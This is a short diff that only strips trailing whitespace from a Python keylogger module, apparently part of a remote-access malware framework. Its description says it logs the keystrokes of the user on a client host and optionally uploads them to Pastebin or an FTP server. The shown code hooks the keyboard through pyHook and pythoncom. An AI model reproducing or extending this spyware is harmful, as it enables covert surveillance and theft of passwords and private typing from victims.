@@ -39,9 +39,9 @@ threads = {}
 results = {}
 usage = 'keylogger <run/status/stop>'
 description = """
-Log the keystrokes of the currently logged-in user on the 
+Log the keystrokes of the currently logged-in user on the
 client host machine and optionally upload them to Pastebin
-or an FTP server 
+or an FTP server
 """
 
 # main
@@ -73,11 +73,11 @@ def _run():
         hm.KeyDown = _event
         hm.HookKeyboard()
         pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
-        if abort: 
+        if abort:
             break
 
 def run():
-    """ 
+    """
     Run the keylogger
 
     """
